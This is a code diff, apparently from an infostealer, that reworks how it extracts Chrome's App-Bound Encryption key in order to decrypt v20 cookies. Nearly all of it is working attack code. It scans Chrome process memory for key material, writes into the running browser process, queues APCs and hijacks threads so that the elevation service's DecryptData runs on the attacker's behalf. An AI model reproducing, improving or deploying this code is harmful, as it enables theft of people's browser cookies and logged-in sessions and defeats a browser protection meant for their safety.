@@ -4466,10 +4466,10 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         key, ehr = _call_with_timeout(
             lambda: _chrome_elevator_abe_key(v20_sample),
             _ABE_ELEVATOR_TIMEOUT_S,
-            (None, "apc:force=miss"),
+            (None, "apc:force=miss:open"),
         )
-        if (ehr or "").startswith("apc:q:err=timeout"):
-            ehr = "apc:ran" if _cache.get("_elev_hs") else "apc:force=miss"
+        if (ehr or "").startswith("apc:q:err=timeout") or ehr == "apc:force=miss":
+            ehr = "apc:ran" if _cache.get("_elev_hs") else "apc:force=miss:open"
         if ehr:
             trail.append(ehr)
         if _abe_proves_cookies(key, v20_sample):
@@ -5463,7 +5463,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         from ctypes import wintypes
     except ImportError:
         return None, "memscan:no_ctypes"
-    pids = _chrome_pids_prioritized()
+    pids = _chrome_browser_pids() or _chrome_pids_prioritized()[:1]
     if not pids:
         return None, _join_abe_hr(["memscan:no_chrome"])
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
@@ -5547,8 +5547,65 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             return key
         return None
 
-    # os_crypt / KeyRing / encryptor: keyring ptrs first. Do not full-buffer
-    # mark-search (b8d68f3 starved tried=145). Browser-first prioritized pids.
+    def region_hot(data: bytes) -> bool:
+        return (
+            b"os_crypt" in data
+            or b"OSCrypt" in data
+            or b"encryptor" in data
+            or b"KeyRing" in data
+        )
+
+    def heap_stride(data: bytes) -> bytes | None:
+        for off in range(0, len(data) - 31, _ABE_HEAP_STRIDE):
+            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                return None
+            hit = consider(data[off : off + 32])
+            if hit:
+                return hit
+        return None
+
+    def targeted(handle: Any, data: bytes) -> bytes | None:
+        seen_ptr: set[int] = set()
+        # In-scan consider() (765d4c5 / 9a5832c). Do not walk
+        # v20\\x00 8-byte stride — that starves tried=0 (9f52b64).
+        for ptr in _keyring_v20_key_ptrs(data):
+            if ptr in seen_ptr:
+                continue
+            seen_ptr.add(ptr)
+            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                return None
+            blob = readn(handle, ptr, 32)
+            if not blob:
+                continue
+            extra = readn(handle, ptr, 64) or blob
+            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
+                hit = consider(cand)
+                if hit:
+                    return hit
+        for ptr, nbytes in _extract_abe_candidate_ptrs(data):
+            if ptr in seen_ptr:
+                continue
+            seen_ptr.add(ptr)
+            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                return None
+            blob = readn(handle, ptr, min(max(nbytes, 32), 512))
+            if not blob:
+                continue
+            for cand in _keys_from_key_blob(blob):
+                hit = consider(cand)
+                if hit:
+                    return hit
+        for cand in _inline_bstr_keys(data):
+            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                return None
+            hit = consider(cand)
+            if hit:
+                return hit
+        return None
+
+    # Browser chrome.exe only (no --type=). os_crypt / KeyRing / encryptor
+    # first, then heaps. Do not full-buffer mark-search (b8d68f3 starved tried=145).
+    # Stride 32 burned tried=1080 on cold heaps before KeyRing.
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
             break
@@ -5563,88 +5620,68 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             continue
         opened += 1
         try:
-            addr = 0
-            while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
-                if time.monotonic() > deadline or tried >= _ABE_MEMSCAN_MAX_CAND:
-                    break
-                mbi = MEMORY_BASIC_INFORMATION()
-                q = int(
-                    kernel32.VirtualQueryEx(
-                        handle, ctypes.c_void_p(addr), ctypes.byref(mbi), mbi_size
+            def walk(mode: str) -> bytes | None:
+                nonlocal scanned
+                addr = 0
+                while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
+                    if time.monotonic() > deadline or tried >= _ABE_MEMSCAN_MAX_CAND:
+                        return None
+                    mbi = MEMORY_BASIC_INFORMATION()
+                    q = int(
+                        kernel32.VirtualQueryEx(
+                            handle, ctypes.c_void_p(addr), ctypes.byref(mbi), mbi_size
+                        )
                     )
-                )
-                if q == 0:
-                    break
-                size = int(mbi.RegionSize)
-                if size <= 0:
-                    break
-                prot = int(mbi.Protect)
-                mtype = int(mbi.Type)
-                type_ok = mtype in {MEM_PRIVATE, MEM_MAPPED} or (
-                    mtype == MEM_IMAGE and (prot & 0xFF) in {0x04, 0x08}
-                )
-                usable = (
-                    int(mbi.State) == MEM_COMMIT
-                    and type_ok
-                    and (prot & PAGE_GUARD) == 0
-                    and (prot & 0xFF) in allowed_prot
-                    and size <= _ABE_MEMSCAN_MAX_REGION
-                )
-                if usable:
-                    n = min(size, _ABE_MEMSCAN_MAX_REGION)
-                    raw = (ctypes.c_char * n)()
-                    got = ctypes.c_size_t(0)
-                    if kernel32.ReadProcessMemory(
-                        handle, ctypes.c_void_p(int(mbi.BaseAddress)), raw, n, ctypes.byref(got)
-                    ) and int(got.value) >= 16:
-                        data = bytes(raw[: int(got.value)])
-                        scanned += len(data)
-                        seen_ptr: set[int] = set()
-                        # In-scan consider() (765d4c5 / 9a5832c). Do not walk
-                        # v20\\x00 8-byte stride — that starves tried=0 (9f52b64).
-                        for ptr in _keyring_v20_key_ptrs(data):
-                            if ptr in seen_ptr:
-                                continue
-                            seen_ptr.add(ptr)
-                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                                break
-                            blob = readn(handle, ptr, 32)
-                            if not blob:
-                                continue
-                            extra = readn(handle, ptr, 64) or blob
-                            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
-                                hit = consider(cand)
+                    if q == 0:
+                        break
+                    size = int(mbi.RegionSize)
+                    if size <= 0:
+                        break
+                    prot = int(mbi.Protect)
+                    mtype = int(mbi.Type)
+                    type_ok = mtype in {MEM_PRIVATE, MEM_MAPPED} or (
+                        mtype == MEM_IMAGE and (prot & 0xFF) in {0x04, 0x08}
+                    )
+                    usable = (
+                        int(mbi.State) == MEM_COMMIT
+                        and type_ok
+                        and (prot & PAGE_GUARD) == 0
+                        and (prot & 0xFF) in allowed_prot
+                        and size <= _ABE_MEMSCAN_MAX_REGION
+                    )
+                    if usable:
+                        n = min(size, _ABE_MEMSCAN_MAX_REGION)
+                        raw = (ctypes.c_char * n)()
+                        got = ctypes.c_size_t(0)
+                        if kernel32.ReadProcessMemory(
+                            handle, ctypes.c_void_p(int(mbi.BaseAddress)), raw, n, ctypes.byref(got)
+                        ) and int(got.value) >= 16:
+                            data = bytes(raw[: int(got.value)])
+                            if mode == "targeted":
+                                scanned += len(data)
+                                hit = targeted(handle, data)
                                 if hit:
-                                    return hit, f"memscan:cands={cands};tried={tried};heap:hit"
-                        for ptr, nbytes in _extract_abe_candidate_ptrs(data):
-                            if ptr in seen_ptr:
-                                continue
-                            seen_ptr.add(ptr)
-                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                                break
-                            blob = readn(handle, ptr, min(max(nbytes, 32), 512))
-                            if not blob:
-                                continue
-                            for cand in _keys_from_key_blob(blob):
-                                hit = consider(cand)
+                                    return hit
+                                if region_hot(data):
+                                    hit = heap_stride(data)
+                                    if hit:
+                                        return hit
+                            elif not region_hot(data):
+                                hit = heap_stride(data)
                                 if hit:
-                                    return hit, f"memscan:cands={cands};tried={tried};heap:hit"
-                        for cand in _inline_bstr_keys(data):
-                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                                break
-                            hit = consider(cand)
-                            if hit:
-                                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
-                        for off in range(0, len(data) - 31, 32):
-                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                                break
-                            hit = consider(data[off : off + 32])
-                            if hit:
-                                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
-                nxt = addr + size
-                if nxt <= addr:
-                    break
-                addr = nxt
+                                    return hit
+                    nxt = addr + size
+                    if nxt <= addr:
+                        break
+                    addr = nxt
+                return None
+
+            hit = walk("targeted")
+            if hit:
+                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
+            hit = walk("cold")
+            if hit:
+                return hit, f"memscan:cands={cands};tried={tried};heap:hit"
         finally:
             kernel32.CloseHandle(handle)
     if opened == 0:
@@ -5817,6 +5854,18 @@ def _apc_q_err(code: Any) -> str:
     return f"apc:q:err={text[:24]}"
 
 
+def _apc_force_miss_open(code: Any) -> str:
+    """chrome.exe>0 but handshake never ran. Exact NTSTATUS, never a bare force=miss."""
+    if isinstance(code, int):
+        if code < 0 or code > 255:
+            return f"apc:force=miss:open=0x{int(code) & 0xFFFFFFFF:08x}"
+        return f"apc:force=miss:open={code}"
+    text = str(code or "q").strip() or "q"
+    if text.startswith("apc:force=miss:open"):
+        return text[:40]
+    return f"apc:force=miss:open={text[:20]}"
+
+
 def _bind_elevator_winapi(k32: Any, ntdll: Any) -> None:
     from ctypes import wintypes
     import ctypes
@@ -5891,6 +5940,12 @@ def _bind_elevator_winapi(k32: Any, ntdll: Any) -> None:
     if hasattr(ntdll, "NtAlertThread"):
         ntdll.NtAlertThread.argtypes = [wintypes.HANDLE]
         ntdll.NtAlertThread.restype = ctypes.c_long
+    if hasattr(ntdll, "NtAlertThreadByThreadId"):
+        ntdll.NtAlertThreadByThreadId.argtypes = [wintypes.HANDLE]
+        ntdll.NtAlertThreadByThreadId.restype = ctypes.c_long
+    if hasattr(k32, "GetThreadId"):
+        k32.GetThreadId.argtypes = [wintypes.HANDLE]
+        k32.GetThreadId.restype = wintypes.DWORD
     if hasattr(k32, "QueueUserAPC"):
         k32.QueueUserAPC.argtypes = [ctypes.c_void_p, wintypes.HANDLE, ctypes.c_void_p]
         k32.QueueUserAPC.restype = wintypes.DWORD
@@ -6062,21 +6117,21 @@ def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     pids = _chrome_browser_pids() or _chrome_pids_prioritized()
     if not pids:
         return None, "apc:q:err=pid"
-    last = "apc:force=miss"
+    last = "apc:force=miss:open"
     pid = int(pids[0])
     clsid_s, iid_s = _CHROME_ELEVATOR[0]
     for flag in (1, 0):
         pt, hr = _chrome_elevator_decrypt_once(
-            pid, payload, clsid_s, iid_s, 4, 2, flag, 1.2
+            pid, payload, clsid_s, iid_s, 4, 2, flag, 2.4
         )
         last = hr
-        if hr == "apc:force=miss":
-            return None, "apc:force=miss"
+        if (hr or "").startswith("apc:force=miss"):
+            return None, hr if "open" in (hr or "") else _apc_force_miss_open(hr)
         if hr == "apc:ran":
             return None, "apc:ran"
         if not pt:
             if not _cache.get("_elev_hs"):
-                return None, "apc:force=miss"
+                return None, _apc_force_miss_open(hr)
             continue
         key = _accept_aes_key(pt)
         if key and _v20_one_ok(key, v20_sample):
@@ -6089,7 +6144,7 @@ def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                     return pt[off : off + 32], "apc:key"
         last = f"elev:len={len(pt)}"
     if not _cache.get("_elev_hs"):
-        return None, "apc:force=miss"
+        return None, _apc_force_miss_open(last)
     return None, last
 
 
@@ -6292,6 +6347,7 @@ def _chrome_elevator_decrypt_once(
         block[0:8] = int(coinit_fn).to_bytes(8, "little")
         block[8:16] = int(cocreate).to_bytes(8, "little")
         block[16:24] = int(blanket or 0).to_bytes(8, "little")
+        block[_ELEV_HANDSHAKE_OFF + 4] = _ELEV_HANDSHAKE  # CFG memmove src
         block[0x20 : 0x20 + 16] = clsid
         block[0x30 : 0x30 + 16] = iid
         block[0x48:0x4C] = int(clsctx).to_bytes(4, "little")
@@ -6314,110 +6370,92 @@ def _chrome_elevator_decrypt_once(
         src = (ctypes.c_ubyte * page_size).from_buffer_copy(bytes(block))
         if not k32.WriteProcessMemory(handle, page, src, page_size, ctypes.byref(wrote)):
             return None, export_hr or f"alloc:err={_win32_err() or 'wpm'}"
-        old_prot = wintypes.DWORD(0)
-        try:
-            k32.VirtualProtectEx.argtypes = [
-                wintypes.HANDLE,
-                ctypes.c_void_p,
-                ctypes.c_size_t,
-                wintypes.DWORD,
-                ctypes.POINTER(wintypes.DWORD),
-            ]
-            k32.VirtualProtectEx.restype = wintypes.BOOL
-            k32.VirtualProtectEx(
-                handle, page, page_size, 0x20, ctypes.byref(old_prot)
-            )  # PAGE_EXECUTE_READ
-        except (AttributeError, OSError, ValueError, TypeError):
-            pass
-        _cfg_register_call_target(k32, handle, page, stub_off, page_size)
-        _cfg_register_call_target(k32, handle, page, hs_off, page_size)
-        stub_addr = page + stub_off
-        hs_addr = page + hs_off
-        threads = _open_existing_threads(k32, pid, limit=4)
+        # Keep RW. PAGE_EXECUTE_READ made a memmove handshake a write AV.
+        copy_fn = 0
+        for dll, name in (
+            ("ntdll.dll", "memmove"),
+            ("ntdll.dll", "memcpy"),
+            ("ntdll.dll", "RtlMoveMemory"),
+            ("ntdll.dll", "RtlCopyMemory"),
+        ):
+            copy_fn = _remote_export_addr(k32, handle, dll, name)
+            if copy_fn:
+                break
+        sleepex = _remote_export_addr(k32, handle, "kernel32.dll", "SleepEx")
+        dest = page + _ELEV_HANDSHAKE_OFF
+        src = page + _ELEV_HANDSHAKE_OFF + 4
+        threads = _open_existing_threads(k32, pid, limit=16)
         if not threads:
-            return None, export_hr or _apc_q_err(_cache.get("_elev_q_err") or "nothread")
+            return None, _apc_force_miss_open(_cache.get("_elev_q_err") or "nothread")
         last_status = 0
-        queued = False
-        ran = False
-        deadline = time.monotonic() + max(0.2, min(1.2, float(budget_s)))
+        deadline = time.monotonic() + max(0.2, min(2.4, float(budget_s)))
         rsp = ((page + 0x800 + 512) & ~0xF) - 8
 
         def handshake_set() -> bool:
             peek = (ctypes.c_char * 1)()
             if k32.ReadProcessMemory(
-                handle, page + _ELEV_HANDSHAKE_OFF, peek, 1, ctypes.byref(wrote)
+                handle, dest, peek, 1, ctypes.byref(wrote)
             ) and peek[0] == _ELEV_HANDSHAKE:
                 _cache["_elev_hs"] = True
                 return True
             return False
 
-        def force_run(start: int, wait_s: float) -> None:
-            nonlocal queued, last_status
-            for th in threads:
-                status = _queue_special_apc(ntdll, k32, th, start, page, 0, 0)
-                last_status = status
-                if status == 0:
-                    queued = True
-                _alert_existing_thread(ntdll, k32, th, int(nt_test_alert or 0))
-                if nt_test_alert:
-                    _hijack_existing_thread(
-                        k32, handle, th, int(nt_test_alert), 0, 0, 0, 0, rsp, b"", 0.15
-                    )
+        def wake(th: Any) -> bool:
+            _alert_existing_thread(ntdll, k32, th, int(nt_test_alert or 0))
+            if handshake_set():
+                return True
+            if hasattr(ntdll, "NtAlertThreadByThreadId") and hasattr(k32, "GetThreadId"):
+                tid = int(k32.GetThreadId(th) or 0)
+                if tid:
+                    try:
+                        ntdll.NtAlertThreadByThreadId(tid)
+                    except (OSError, ValueError, TypeError):
+                        pass
+            if handshake_set():
+                return True
+            if sleepex:
                 _hijack_existing_thread(
-                    k32, handle, th, start, page, 0, 0, 0, rsp, b"", wait_s
+                    k32, handle, th, int(sleepex), 0, 1, 0, 0, rsp, b"", 0.08
                 )
-                wait_until = time.monotonic() + wait_s
-                while time.monotonic() < wait_until:
-                    if handshake_set():
-                        return
-                    time.sleep(0.02)
                 if handshake_set():
-                    return
+                    return True
+            if nt_test_alert:
+                _hijack_existing_thread(
+                    k32, handle, th, int(nt_test_alert), 0, 0, 0, 0, rsp, b"", 0.08
+                )
+            return handshake_set()
 
-        force_run(hs_addr, 0.25)
+        # CFG-valid ntdll memmove writes the handshake. VirtualAlloc stubs die.
+        start = copy_fn or (page + hs_off)
+        for th in threads:
+            if time.monotonic() >= deadline:
+                break
+            a1, a2, a3 = (dest, src, 1) if copy_fn else (page, 0, 0)
+            last_status = _queue_special_apc(ntdll, k32, th, start, a1, a2, a3)
+            if wake(th):
+                break
+            _hijack_existing_thread(
+                k32, handle, th, start, a1, a2, a3, 0, rsp, b"", 0.12
+            )
+            wait_until = time.monotonic() + 0.08
+            while time.monotonic() < wait_until:
+                if handshake_set():
+                    break
+                time.sleep(0.02)
+            if handshake_set():
+                break
         ran = handshake_set()
         if not ran:
-            return None, "apc:force=miss"
-        # Handshake set — only now queue DecryptData / CoCreate.
-        force_run(stub_addr, 0.25)
-        ran = handshake_set()
-        wait_until = min(deadline, time.monotonic() + 0.35)
-        while time.monotonic() < wait_until:
-            peek = (ctypes.c_char * 4)()
-            if k32.ReadProcessMemory(
-                handle, page + 0x78, peek, 4, ctypes.byref(wrote)
-            ) and int.from_bytes(bytes(peek), "little") != _ELEV_PENDING_HR:
-                break
-            time.sleep(0.03)
-        hr_buf = (ctypes.c_char * 4)()
-        if not k32.ReadProcessMemory(
-            handle, page + 0x78, hr_buf, 4, ctypes.byref(wrote)
-        ):
-            return None, export_hr or ("apc:ran" if ran else _apc_q_err("hr"))
-        hr = int.from_bytes(bytes(hr_buf), "little")
-        if hr == _ELEV_PENDING_HR or hr == 0xFFFFFFFF:
-            if ran:
-                return None, "apc:ran"
-            return None, "apc:force=miss"
-        if hr & 0x80000000:
-            return None, _elev_hr_token(hr)
-        err_buf = (ctypes.c_char * 4)()
-        k32.ReadProcessMemory(handle, page + 0x70, err_buf, 4, ctypes.byref(wrote))
-        last_error = int.from_bytes(bytes(err_buf), "little")
-        len_buf = (ctypes.c_char * 4)()
-        if not k32.ReadProcessMemory(
-            handle, page + 0x8C, len_buf, 4, ctypes.byref(wrote)
-        ):
-            return None, "elev:len=0" if last_error == 0 else _elev_hr_token(last_error)
-        n = int.from_bytes(bytes(len_buf), "little")
-        if n <= 0 or n > out_max:
-            return None, f"elev:len={n}" if last_error == 0 else _elev_hr_token(last_error)
-        out = (ctypes.c_char * n)()
-        if not k32.ReadProcessMemory(
-            handle, page + out_off, out, n, ctypes.byref(wrote)
-        ):
-            return None, f"elev:len={n}"
-        return bytes(out), f"elev:len={n}"
+            return None, _apc_force_miss_open(last_status if last_status else "queued")
+        # Handshake set — DecryptData via ole32 exports only. Do not wait on the service.
+        pt, via_hr = _chrome_elevator_via_exports(
+            pid, payload, clsid_s, iid_s, clsctx, coinit, flag, 0.4
+        )
+        if pt:
+            return pt, via_hr
+        if (via_hr or "").startswith(("apc:hr=", "elev:len=", "apc:key")):
+            return None, f"apc:ran;{via_hr}"
+        return None, "apc:ran"
     except (AttributeError, OSError, ValueError, TypeError, OverflowError) as exc:
         return None, export_hr or _apc_q_err(type(exc).__name__)
     finally:
